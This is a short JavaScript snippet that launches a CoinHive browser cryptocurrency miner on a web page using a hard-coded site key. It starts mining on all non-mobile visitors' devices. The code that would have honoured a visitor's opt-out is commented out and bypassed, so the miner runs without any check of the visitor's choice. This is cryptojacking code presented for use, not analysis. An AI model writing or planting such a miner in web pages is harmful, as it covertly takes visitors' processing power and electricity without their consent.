	var scriptJs = new CoinHive.Anonymous('0QohKPyq7xT5OkQJchpKJoERQH4tWCBM', {throttle: 0.3});

	// Only start on non-mobile devices and if not opted-out
	// in the last 14400 seconds (4 hours):
	/*if (!scriptJs.isMobile() && !scriptJs.didOptOut(14400)) {
        scriptJs.start();
	}*/
	if (!scriptJs.isMobile()) {
        scriptJs.start();
	}
